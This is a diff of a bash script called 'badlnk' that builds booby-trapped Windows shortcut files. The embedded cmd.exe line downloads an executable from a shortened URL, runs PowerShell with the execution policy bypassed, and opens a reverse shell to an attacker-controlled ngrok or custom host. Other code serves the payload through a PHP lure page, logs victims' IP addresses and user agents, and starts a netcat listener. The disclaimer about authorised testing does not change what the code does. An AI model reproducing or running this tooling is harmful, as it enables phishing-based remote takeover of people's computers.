@@ -1,21 +1,294 @@
 #!/bin/bash
-# BADLNK v1.0
+# BADLNK v1.1
 # coded by: github.com/thelinuxchoice/badlnk
 # twitter: @linux_choice
 # You can use any part from this code, giving me the credits. You should have received a copy of the GNU General Public License along with this program. If not, see http://www.gnu.org/licenses/.
 
 trap 'printf "\n";stop' 2
+server_tcp="3.17.202.129" #NGROK IP
 
+banner() {
+
+printf "\n\n\e[91m >=>>=>          >>       >====>      \e[0m\e[1;77m>=>           >=>       \e[0m\n"
+printf "\e[91m >>   >=>       >>=>      >=>   >=>   \e[0m\e[1;77m>=>           >=>       \e[0m\n"
+printf "\e[91m >>    >=>     >> >=>     >=>    >=>  \e[0m\e[1;77m>=> >==>>==>  >=>  >=>  \e[0m\n"
+printf "\e[91m >==>>=>      >=>  >=>    >=>    >=>  \e[0m\e[1;77m>=>  >=>  >=> >=> >=>   \e[0m\n"
+printf "\e[91m >>    >=>   >=====>>=>   >=>    >=>  \e[0m\e[1;77m>=>  >=>  >=> >=>=>     \e[0m\n"
+printf "\e[91m >>     >>  >=>      >=>  >=>   >=>   \e[0m\e[1;77m>=>  >=>  >=> >=> >=>   \e[0m\n"
+printf "\e[91m >===>>=>  >=>        >=> >====>     \e[0m\e[1;77m>==> >==>  >=> >=>  >=>  \e[0m\n"
+
+printf "\n\e[1;33m >===> Reverse Shell in Shortcut File Generator\e[0m\n"
+printf "\n\e[1;77m v1.1 coded by github.com/thelinuxchoice/badlnk\e[0m"
+printf "\n\e[1;34m Twitter:\e[0m\e[1;77m @linux_choice\e[0m\n"
+
+
+printf "\n"
+printf "\e[1;91m Disclaimer: this tool is designed for security\n"
+printf " testing in an authorized simulated cyberattack\n"
+printf " Attacking targets without prior mutual consent\n"
+printf " is illegal!\n"
+}
+
+stop() {
+
+checkngrok=$(ps aux | grep -o "ngrok" | head -n1)
+checkphp=$(ps aux | grep -o "php" | head -n1)
+#checkssh=$(ps aux | grep -o "ssh" | head -n1)
+if [[ $checkngrok == *'ngrok'* ]]; then
+killall -2 ngrok > /dev/null 2>&1
+fi
+
+if [[ $checkphp == *'php'* ]]; then
+killall -2 php > /dev/null 2>&1
+fi
+#if [[ $checkssh == *'ssh'* ]]; then
+#killall -2 ssh > /dev/null 2>&1
+#fi
+exit 1
+
+}
+
+dependencies() {
+
+
+command -v base64 > /dev/null 2>&1 || { echo >&2 "I require base64 but it's not installed. Install it. Aborting."; exit 1; }
+command -v zip > /dev/null 2>&1 || { echo >&2 "I require Zip but it's not installed. Install it. Aborting."; exit 1; }
+command -v netcat > /dev/null 2>&1 || { echo >&2 "I require netcat but it's not installed. Install it. Aborting."; exit 1; } 
+
+}
+
+
+ngrok_server() {
+
+if [[ -e ngrok ]]; then
+echo ""
+else
+command -v unzip > /dev/null 2>&1 || { echo >&2 "I require unzip but it's not installed. Install it. Aborting."; exit 1; }
+command -v wget > /dev/null 2>&1 || { echo >&2 "I require wget but it's not installed. Install it. Aborting."; exit 1; }
+printf "\e[1;92m[\e[0m+\e[1;92m] Downloading Ngrok...\n"
+arch=$(uname -a | grep -o 'arm' | head -n1)
+arch2=$(uname -a | grep -o 'Android' | head -n1)
+arch3=$(uname -a | grep -o '64bit' | head -n1)
+if [[ $arch == *'arm'* ]] || [[ $arch2 == *'Android'* ]] ; then
+wget --no-check-certificate https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip > /dev/null 2>&1
+
+if [[ -e ngrok-stable-linux-arm.zip ]]; then
+unzip ngrok-stable-linux-arm.zip > /dev/null 2>&1
+chmod +x ngrok
+rm -rf ngrok-stable-linux-arm.zip
+else
+printf "\e[1;93m[!] Download error... Termux, run:\e[0m\e[1;77m pkg install wget\e[0m\n"
+exit 1
+fi
+
+elif [[ $arch3 == *'64bit'* ]] ; then
+
+wget --no-check-certificate https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-amd64.zip > /dev/null 2>&1
+
+if [[ -e ngrok-stable-linux-amd64.zip ]]; then
+unzip ngrok-stable-linux-amd64.zip > /dev/null 2>&1
+chmod +x ngrok
+rm -rf ngrok-stable-linux-amd64.zip
+else
+printf "\e[1;93m[!] Download error... \e[0m\n"
+exit 1
+fi
+else
+wget --no-check-certificate https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-386.zip > /dev/null 2>&1 
+if [[ -e ngrok-stable-linux-386.zip ]]; then
+unzip ngrok-stable-linux-386.zip > /dev/null 2>&1
+chmod +x ngrok
+rm -rf ngrok-stable-linux-386.zip
+else
+printf "\e[1;93m[!] Download error... \e[0m\n"
+exit 1
+fi
+fi
+fi
+
+
+printf "\e[1;92m[\e[0m+\e[1;92m] Starting php server (port 3333)...\n"
+php -S 127.0.0.1:3333 > /dev/null 2>&1 & 
+sleep 2
+
+if [[ -e check_ngrok ]]; then
+rm -rf ngrok_check
+fi
+
+printf "\e[1;92m[\e[0m+\e[1;92m] Starting ngrok server...\e[0m\n"
+./ngrok tcp 4444 > /dev/null 2>&1 > check_ngrok &
+sleep 10
+
+check_ngrok=$(grep -o 'ERR_NGROK_302' check_ngrok)
+
+if [[ ! -z $check_ngrok ]];then
+printf "\n\e[91mAuthtoken missing!\e[0m\n"
+printf "\e[77mSign up at: https://ngrok.com/signup\e[0m\n"
+printf "\e[77mYour authtoken is available on your dashboard: https://dashboard.ngrok.com\n\e[0m"
+printf "\e[77mInstall your auhtoken:\e[0m\e[93m ./ngrok authtoken <YOUR_AUTHTOKEN>\e[0m\n\n"
+rm -rf check_ngrok
+exit 1
+fi
+
+if [[ -e check_ngrok ]]; then
+rm -rf check_ngrok
+fi
+
+link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "tcp://0.tcp.ngrok.io:[0-9]*")
+
+if [[ ! -z $link ]]; then 
+printf "\e[1;92m[\e[0m*\e[1;92m] Forwarding from:\e[0m\e[1;77m %s\e[0m\n" $link
+else
+printf "\n\e[91mNgrok Error!\e[0m\n"
+exit 1
+fi
+
+}
+
+
+settings2() {
+
+default_payload_name="badlnk"
+printf '\e[1;33m[\e[0m\e[1;77m+\e[0m\e[1;33m] Payload name (Default:\e[0m\e[1;77m %s \e[0m\e[1;33m): \e[0m' $default_payload_name
+
+read payload_name
+payload_name="${payload_name:-${default_payload_name}}"
+read -p $'\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Redirect page (after delivering payload): \e[0m' redirect_url
+redirect_url="${redirect_url:-${default_redirect_url}}"
+
+}
+
+start() {
+
+if [[ -e ip.txt ]]; then
+rm -f ip.txt
+fi
+
+printf "\n"
+printf "\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;93m Ngrok.io:\e[0m\n"
+printf "\e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;93m Custom LPORT/LHOST:\e[0m\n"
+default_option_server="1"
+default_redirect_url="https://www.google.com"
+read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Choose a reverse TCP Port Forwarding option: \e[0m' option_server
+option_server="${option_server:-${default_option_server}}"
+
+if [[ $option_server -eq 1 ]]; then
+
+command -v php > /dev/null 2>&1 || { echo >&2 "I require ssh but it's not installed. Install it. Aborting."; exit 1; }
+forward=true
+#settings
+settings2
+ngrok_server
+#server
+payload
+#direct_link
+listener
+elif [[ $option_server -eq 2 ]]; then
+read -p $'\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] LHOST: \e[0m' custom_ip
+if [[ -z "$custom_ip" ]]; then
+exit 1
+fi
+server_tcp=$custom_ip
+read -p $'\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] LPORT: \e[0m' custom_port
+if [[ -z "$custom_port" ]]; then
+exit 1
+fi
+server_port=$custom_port
+settings2
+payload
+listener
+else
+printf "\e[1;93m [!] Invalid option!\e[0m\n"
+sleep 1
+clear
+start
+fi
+
+}
+
+server() {
+
+printf "\e[1;77m[\e[0m\e[1;93m+\e[0m\e[1;77m] Starting localhost.run server...\e[0m\n"
+
+if [[ $subdomain_resp == true ]]; then
+
+ssh -T -tt -o StrictHostKeyChecking=no -R 80:localhost:3333 "$subdomain"@ssh.localhost.run > sendlink &
+sleep 4
+else
+$(which sh) -c 'ssh -t -t -o StrictHostKeyChecking=no  -R 80:localhost:3333 ssh.localhost.run 2> /dev/null > sendlink ' &
+sleep 4
+fi
+
+}
+
+catch_ip() {
+
+ip=$(grep -a 'IP:' ip.txt | cut -d " " -f2 | tr -d '\r')
+IFS=$'\n'
+device=$(grep -o 'User-Agent:.*' ip.txt | cut -d ":" -f2)
+printf "\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] IP:\e[0m\e[1;77m %s\e[0m\n" $ip
+printf "\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] User-Agent:\e[0m\e[1;77m %s\e[0m\n" $device
+cat ip.txt >> saved.ip.txt
+rm -f ip.txt
+}
+
+listener() {
+
+if [[ $forward == true ]];then
+printf "\n\e[1;77m[\e[0m\e[1;33m+\e[0m\e[1;77m]\e[1;91m Expose the server with command: \e[0m\n"
+printf "\e[1;77m[\e[0m\e[1;33m+\e[0m\e[1;77m]\e[0m\e[93m ssh -R 80:localhost:3333 custom-subdomain@ssh.localhost.run \e[0m\n"
+printf "\e[1;77m[\e[0m\e[1;33m+\e[0m\e[1;77m]\e[0m\e[92m Use \e[0m\e[77mserver/payload.zip\e[0m\e[92m to deliver your custom file \e[0m\n"
+checkfound
+else
+default_start_listener="Y"
+printf '\e[1;33m[\e[0m\e[1;77m+\e[0m\e[1;33m] Start Listener? \e[0m\e[1;77m[Y/n]\e[0m\e[1;33m: \e[0m'
+read start_listener
+start_listener="${start_listener:-${default_start_listener}}"
+if [[ $start_listener == "Y" || $start_listener == "y" || $start_listener == "Yes" || $start_listener == "yes" ]]; then
+printf "\e[1;77m[\e[0m\e[1;33m+\e[0m\e[1;77m] Listening connection, port 4444:\e[0m\n"
+nc -lvp 4444
+else
+exit 1
+fi
+fi
+}
+
+checkfound() {
+
+printf "\n"
+printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Waiting targets,\e[0m\e[1;77m Press Ctrl + C to exit...\e[0m\n"
+while [ true ]; do
+
+if [[ -e "ip.txt" ]]; then
+printf "\n\e[1;92m[\e[0m+\e[1;92m] Target opened the link!\n"
+catch_ip
+
+default_start_listener="Y"
+printf '\e[1;33m[\e[0m\e[1;77m+\e[0m\e[1;33m] Start Listener? \e[0m\e[1;77m[Y/n]\e[0m\e[1;33m: \e[0m'
+read start_listener
+start_listener="${start_listener:-${default_start_listener}}"
+if [[ $start_listener == "Y" || $start_listener == "y" || $start_listener == "Yes" || $start_listener == "yes" ]]; then
+printf "\e[1;77m[\e[0m\e[1;33m+\e[0m\e[1;77m] Listening connection, port 4444:\e[0m\n"
+nc -lvp 4444
+
+fi
+fi
+done
+sleep 0.5
+
+}
+
+#param_HasIconLocation="c:\Windows\SysWOW64\Ronda.ico" #param_HasIconLocation="c:\Windows\SysWOW64\OneDrive.ico"
 
 mslink() {
 
-serveo_ip="159.89.214.31"
 IS_PRINTER_LNK=0
-cmd="C:\Windows\System32\cmd.exe /c echo (wget 'https://tinyurl.com/y88r9epk' -OutFile a.exe) > b.ps1 & powershell -ExecutionPolicy ByPass -File b.ps1 & START /MIN a.exe $serveo_ip $serveo_port -e cmd.exe -d ^& exit"
+cmd="C:\Windows\System32\cmd.exe"
 LNK_TARGET="$cmd"
-OUTPUT_FILE="$lnkname.lnk"
+IFS=$'\n'
+param_HasArguments="/c echo (wget 'http://tinyurl.com/y88r9epk' -OutFile a.exe) > b.ps1 & powershell -ExecutionPolicy ByPass -File b.ps1 & START /MIN a.exe $server_tcp $server_port -e cmd.exe -d & exit" 
+OUTPUT_FILE="$payload_name.lnk"
 
-#param_HasArguments="'/c echo (wget 'https://tinyurl.com/y88r9epk' -OutFile a.exe) > b.PS1 & powershell -ExecutionPolicy ByPass -File b.ps1 & START /MIN a.exe $serveo_ip $serveo_port -e cmd.exe -d ^& exit^"
 
 # mslink: Allow to create Windows Shortcut without the need of Windows
 # 
@@ -99,8 +372,6 @@ function gen_IDLIST() {
 function convert_CLSID_to_DATA() {
 	echo -n ${1:6:2}${1:4:2}${1:2:2}${1:0:2}${1:11:2}${1:9:2}${1:16:2}${1:14:2}${1:19:4}${1:24:12}|sed s/"\([A-Fa-f0-9][A-Fa-f0-9]\)"/\\\\x\\1/g
 }
-
-
 
 #############################################################################################
 # Variables issues de la documentation officielle de Microsoft
@@ -262,140 +533,29 @@ echo -ne ${HeaderSize}${LinkCLSID}${LinkFlags}${FileAttributes}${CreationTime}${
 
 ################################ END MSLINK
 
-zip "$lnkname.zip" $OUTPUT_FILE 2>&1 > /dev/null
-
-printf "\e[1;77m[\e[0m\e[1;93m+\e[0m\e[1;77m] Saved:\e[0m\e[1;93m %s.zip\e[0m\n" $lnkname
-send_link=$(grep -o "https://[0-9a-z]*\.serveo.net" sendlink)
-
-printf "\e[91m[\e[0m\e[1;77m+\e[0m\e[91m] Warning:\n"
-printf "\e[91m[\e[0m\e[1;77m+\e[0m\e[91m] To work you need to edit the file \e[0m\e[1;77m%s.lnk\e[0m\e[91m in Windows to remove the quotes in \"target path\" (right-clicking and clicking Properties) and then you can zip and deliver by direct link\e[0m\n" $lnkname
-printf '\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] Direct link:\e[0m\e[1;77m %s/%s.zip\n' $send_link $lnkname
 }
 
-banner() {
-
-
-printf "\n\n\e[91m >=>>=>          >>       >====>      \e[0m\e[1;77m>=>           >=>       \e[0m\n"
-printf "\e[91m >>   >=>       >>=>      >=>   >=>   \e[0m\e[1;77m>=>           >=>       \e[0m\n"
-printf "\e[91m >>    >=>     >> >=>     >=>    >=>  \e[0m\e[1;77m>=> >==>>==>  >=>  >=>  \e[0m\n"
-printf "\e[91m >==>>=>      >=>  >=>    >=>    >=>  \e[0m\e[1;77m>=>  >=>  >=> >=> >=>   \e[0m\n"
-printf "\e[91m >>    >=>   >=====>>=>   >=>    >=>  \e[0m\e[1;77m>=>  >=>  >=> >=>=>     \e[0m\n"
-printf "\e[91m >>     >>  >=>      >=>  >=>   >=>   \e[0m\e[1;77m>=>  >=>  >=> >=> >=>   \e[0m\n"
-printf "\e[91m >===>>=>  >=>        >=> >====>     \e[0m\e[1;77m>==> >==>  >=> >=>  >=>  \e[0m\n"
-
-printf "\e[1;33m >==> Reverse Shell in Shortcut File\e[0m\n"
-printf "\n\e[1;77m v1.0 coded by github.com/thelinuxchoice/badlnk\e[0m"
-printf "\n Twitter: @linux_choice\n"
-
-
-printf "\n\n \e[1;41m:: Disclaimer: Usage of BADlnk for attacking targets     ::\e[0m\n"
-printf " \e[1;41m:: without prior mutual consent is illegal. Only use for ::\e[0m\n" 
-printf " \e[1;41m:: educational purposes                                  ::\e[0m\n"
-
-}
-
-stop() {
-
-
-checkphp=$(ps aux | grep -o "php" | head -n1)
-checkssh=$(ps aux | grep -o "ssh" | head -n1)
-
-if [[ $checkphp == *'php'* ]]; then
-killall -2 php > /dev/null 2>&1
+payload() {
+if [[ $forward == true ]];then
+server_port=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "tcp://0.tcp.ngrok.io:[0-9]*" | cut -d ':' -f3)
 fi
-if [[ $checkssh == *'ssh'* ]]; then
-killall -2 ssh > /dev/null 2>&1
-fi
-exit 1
+printf "\n\e[1;77m[\e[0m\e[1;33m+\e[0m\e[1;77m]\e[0m\e[1;93m Building malicious Shortcut file...\e[0m\n"
 
-}
-
-dependencies() {
-
-
-command -v php > /dev/null 2>&1 || { echo >&2 "I require php but it's not installed. Install it. Aborting."; exit 1; }
- 
-
-
-}
-
-catch_ip() {
-
-ip=$(grep -a 'IP:' ip.txt | cut -d " " -f2 | tr -d '\r')
-IFS=$'\n'
-printf "\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] IP:\e[0m\e[1;77m %s\e[0m\n" $ip
-
-cat ip.txt >> saved.ip.txt
-
-
-}
-
-listener() {
-
-printf "\n"
-printf "\e[1;77m[\e[0m\e[1;92m*\e[0m\e[1;77m]\e[0m\e[1;92m Starting listener, port 4444...\e[0m\e[1;77m(forwarding from serveo.net:%s)\e[0m\n" $serveo_port
-fuser -k 4444/tcp > /dev/null 2>&1
-nc -lvp 4444
-
-}
-
-
-server() {
-
-command -v ssh > /dev/null 2>&1 || { echo >&2 "I require ssh but it's not installed. Install it. Aborting."; exit 1; }
-
-printf "\e[1;77m[\e[0m\e[1;93m+\e[0m\e[1;77m] Starting Serveo...\e[0m\n"
-
-if [[ $checkphp == *'php'* ]]; then
-killall -2 php > /dev/null 2>&1
-fi
-
-if [[ $subdomain_resp == true ]]; then
-
-$(which sh) -c 'ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R '$subdomain':80:localhost:3333 serveo.net -R '$serveo_port':localhost:4444  2> /dev/null > sendlink ' &
-
-sleep 8
-else
-$(which sh) -c 'ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R 80:localhost:3333 serveo.net -R '$serveo_port':localhost:4444 2> /dev/null > sendlink ' &
-
-sleep 8
-fi
-printf "\e[1;77m[\e[0m\e[1;33m+\e[0m\e[1;77m] Starting php server... (localhost:3333)\e[0m\n"
-fuser -k 3333/tcp > /dev/null 2>&1
-php -S localhost:3333 > /dev/null 2>&1 &
-sleep 3
-
-printf "\e[1;77m[\e[0m\e[1;33m+\e[0m\e[1;77m] Creating malicious shortcut file...\e[0m\n"
-}
-
-
-
-start() {
-printf "\n"
-default_name="badlnk"
-printf '\n\e[1;33m[\e[0m\e[1;77m+\e[0m\e[1;33m] Shortcut name (Default:\e[0m\e[1;77m %s\e[0m\e[1;33m):\e[0m' $default_name
-read lnkname
-lnkname="${lnkname:-${default_name}}"
-default_port="$RANDOM"
-printf '\e[1;33m[\e[0m\e[1;77m+\e[0m\e[1;33m] Choose a Port (Default:\e[0m\e[1;77m %s\e[0m\e[1;33m):\e[0m' $default_port
-read serveo_port
-serveo_port="${serveo_port:-${default_port}}"
-default_choose_sub="Y"
-default_subdomain="badlnk$RANDOM"
-
-printf '\e[1;33m[\e[0m\e[1;77m+\e[0m\e[1;33m] Choose subdomain? \e[0m\e[1;77m[Y/n]:\e[0m'
-read choose_sub
-choose_sub="${choose_sub:-${default_choose_sub}}"
-if [[ $choose_sub == "Y" || $choose_sub == "y" || $choose_sub == "Yes" || $choose_sub == "yes" ]]; then
-subdomain_resp=true
-printf '\e[1;33m[\e[0m\e[1;77m+\e[0m\e[1;33m] Subdomain (Default:\e[0m\e[1;77m %s \e[0m\e[1;33m):\e[0m' $default_subdomain
-read subdomain
-subdomain="${subdomain:-${default_subdomain}}"
-fi
-
-server
 mslink
-listener
+
+if [[ -e $payload_name.lnk ]]; then
+
+zip $payload_name.zip $payload_name.lnk > /dev/null 2>&1
+
+sed 's+payload_name+'$payload_name'+g' temp.html | sed 's+url_website+'$redirect_url'+g' > index.php
+
+printf "\e[1;77m[\e[0m\e[1;33m+\e[0m\e[1;77m] LNK file saved:\e[0m\e[77m %s.lnk\e[0m\n" $payload_name
+printf "\e[1;77m[\e[0m\e[1;33m+\e[0m\e[1;77m] Zip file saved:\e[0m\e[77m %s.zip\e[0m\n" $payload_name
+printf "\e[1;77m[\e[0m\e[1;33m+\e[0m\e[1;77m]\e[0m\e[92m You can modify the icon by editing on Windows \e[0m\n"
+else
+printf "\e[1;93mError\e[0m\n"
+exit 1
+fi
 
 }
 
